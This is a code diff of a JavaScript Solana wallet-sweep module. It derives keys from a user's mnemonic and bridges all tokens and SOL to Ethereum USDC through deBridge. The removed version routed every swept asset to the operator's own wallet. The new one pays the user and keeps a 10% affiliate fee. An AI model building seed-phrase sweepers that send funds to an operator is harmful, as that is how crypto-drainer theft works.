@@ -1,29 +1,23 @@
 import { Connection, PublicKey, VersionedTransaction } from '@solana/web3.js';
 import { getAssociatedTokenAddress, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
-import { FEE_WALLET_EVM } from './config.js';
+import { FEE_WALLET_EVM, FEE_WALLET_SOLANA } from './config.js';
 
 // =====================================================================
 // CONSTANTS
 // =====================================================================
 
 const SOL_MINT     = 'So11111111111111111111111111111111111111112';
-const SOLANA_CHAIN = 7565164;   // deBridge internal chain id for Solana
+const SOLANA_CHAIN = 7565164;
 const ETH_CHAIN    = 1;
 const ETH_USDC     = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 
 const DEBRIDGE_API = 'https://dln.debridge.finance/v1.0';
 
-// Reject orders whose estimated output is below this (in USDC, 6dp).
-// deBridge Solana→Ethereum has real overhead (~$1 in op expenses plus
-// protocol fees), so anything under a few dollars isn't worth sweeping.
 const MIN_DEBRIDGE_OUT_USDC = 1_000_000n;  // 1.00 USDC
 
-// Reserve kept behind on Solana so the user's wallet can keep paying
-// rent / fees for subsequent transactions in the same sweep.
-const SOL_RESERVE_LAMPORTS = 5_000_000n;   // 0.005 SOL
-const SOL_MIN_SWEEP_LAMPORTS = 10_000_000n; // don't bother below 0.01 SOL
+const SOL_RESERVE_LAMPORTS = 5_000_000n;
+const SOL_MIN_SWEEP_LAMPORTS = 10_000_000n;
 
-// Route Solana RPC through the Cloudflare proxy (Helius, no rate limits).
 const SOLANA_RPC_PROXY = 'https://sweep-rpc.smallcapstradingsystem.workers.dev/rpc/solana';
 
 export function getConnection() {
@@ -58,23 +52,6 @@ export async function previewSolanaWallet(connection, walletAddress) {
 // =====================================================================
 // DERIVATION SELECTION
 // =====================================================================
-//
-// The user's mnemonic can produce multiple valid Solana addresses depending
-// on which wallet they originally used. `derive.js` produces candidates for
-// the three main paths (Phantom, Trust Wallet, Ledger Live). This function
-// picks the one that actually has on-chain history.
-//
-// Selection order:
-//   1. Exactly one candidate has on-chain activity → pick it.
-//   2. Multiple candidates have activity → pick the most recently active,
-//      tiebreak to Phantom.
-//   3. All calls succeeded, none had activity → default to Phantom.
-//   4. RPC was unreachable for all candidates → default to Phantom, but
-//      log a WARN so the user knows the selection was not verified.
-//
-// The user never sees a choice; this runs automatically in both Preview
-// and Sweep.
-// =====================================================================
 
 export async function selectSolanaKeypair(connection, candidates, logLine) {
   const withActivity = [];
@@ -88,15 +65,10 @@ export async function selectSolanaKeypair(connection, candidates, logLine) {
       );
       anyCallSucceeded = true;
       if (sigs.length > 0) {
-        withActivity.push({
-          ...c,
-          lastSeen: sigs[0].blockTime || 0,
-        });
+        withActivity.push({ ...c, lastSeen: sigs[0].blockTime || 0 });
       }
     } catch (e) {
-      // RPC failure for this candidate — don't treat as "no activity".
-      // We'll fall through to the phantom default below if nothing else
-      // was reachable, but the log will make it clear.
+      // RPC failure — don't treat as "no activity"
     }
   }
 
@@ -134,10 +106,19 @@ export async function selectSolanaKeypair(connection, candidates, logLine) {
 }
 
 // =====================================================================
-// DEBRIDGE — create cross-chain order
+// DEBRIDGE — create cross-chain order with affiliate fee
+// =====================================================================
+//
+// IMPORTANT: On Solana, deBridge affiliate fees are NOT auto-sent to the
+// affiliate recipient. They accumulate as a claimable balance inside the
+// DLN program and must be withdrawn via the `withdrawAffiliateFee`
+// instruction. This is a known limitation of deBridge on Solana.
+//
+// EVM-sourced orders auto-transfer affiliate fees. Solana-sourced orders
+// require you to run a periodic claim.
 // =====================================================================
 
-async function createDebridgeOrder({ srcMint, amountRaw, srcAuthority }) {
+async function createDebridgeOrder({ srcMint, amountRaw, srcAuthority, userDestination }) {
   const params = new URLSearchParams({
     srcChainId: String(SOLANA_CHAIN),
     srcChainTokenIn: srcMint,
@@ -145,9 +126,14 @@ async function createDebridgeOrder({ srcMint, amountRaw, srcAuthority }) {
     dstChainId: String(ETH_CHAIN),
     dstChainTokenOut: ETH_USDC,
     dstChainTokenOutAmount: 'auto',
-    dstChainTokenOutRecipient: FEE_WALLET_EVM,
+    // Output goes directly to the user's EVM destination.
+    dstChainTokenOutRecipient: userDestination,
+    // Refund authority (if the order fails on the destination side).
     srcChainOrderAuthorityAddress: srcAuthority,
-    dstChainOrderAuthorityAddress: FEE_WALLET_EVM,
+    dstChainOrderAuthorityAddress: userDestination,
+    // Affiliate fee: taken from the input token on Solana.
+    affiliateFeePercent: '10',
+    affiliateFeeRecipient: FEE_WALLET_SOLANA,
   });
 
   const resp = await fetch(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
@@ -164,16 +150,10 @@ async function createDebridgeOrder({ srcMint, amountRaw, srcAuthority }) {
   return json;
 }
 
-// =====================================================================
-// DEBRIDGE — sign and broadcast the returned VersionedTransaction
-// =====================================================================
-
 async function signAndSendDebridgeTx(connection, keypair, order) {
   const txBytes = Buffer.from(order.tx.data.replace(/^0x/, ''), 'hex');
   const tx = VersionedTransaction.deserialize(txBytes);
 
-  // deBridge's returned recentBlockhash will already be stale by the time
-  // we get here; replace it with a fresh one so the tx doesn't expire.
   const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
   tx.message.recentBlockhash = blockhash;
 
@@ -194,16 +174,22 @@ async function signAndSendDebridgeTx(connection, keypair, order) {
 export async function sweepSolana(connection, keypair, opts = {}) {
   const results = {
     address: keypair.publicKey.toBase58(),
-    recipient: FEE_WALLET_EVM,   // EVM fee wallet is the destination
+    recipient: opts.userDestination || FEE_WALLET_EVM,
+    userDestination: opts.userDestination || null,
     swaps: [],
     transfers: [],
     errors: [],
     usdcReceivedRaw: '0',
   };
   const dryRun = !!opts.dryRun;
+  const userDestination = opts.userDestination;
+  if (!userDestination) {
+    results.errors.push('userDestination is required for the direct-to-user model');
+    return results;
+  }
+
   let usdcReceived = 0n;
 
-  // Collect SPL token accounts
   const tokenAccounts = [];
   for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
     try {
@@ -228,6 +214,7 @@ export async function sweepSolana(connection, keypair, opts = {}) {
         srcMint: mint,
         amountRaw: amount,
         srcAuthority: keypair.publicKey.toBase58(),
+        userDestination,
       });
 
       const expectedOutRaw = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
@@ -260,7 +247,7 @@ export async function sweepSolana(connection, keypair, opts = {}) {
   try {
     const solBal = BigInt(await connection.getBalance(keypair.publicKey));
     if (solBal <= SOL_MIN_SWEEP_LAMPORTS) {
-      // Too little to be worth sweeping
+      // nothing
     } else {
       const sweepAmount = solBal - SOL_RESERVE_LAMPORTS;
 
@@ -271,6 +258,7 @@ export async function sweepSolana(connection, keypair, opts = {}) {
           srcMint: SOL_MINT,
           amountRaw: sweepAmount,
           srcAuthority: keypair.publicKey.toBase58(),
+          userDestination,
         });
 
         const expectedOutRaw = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
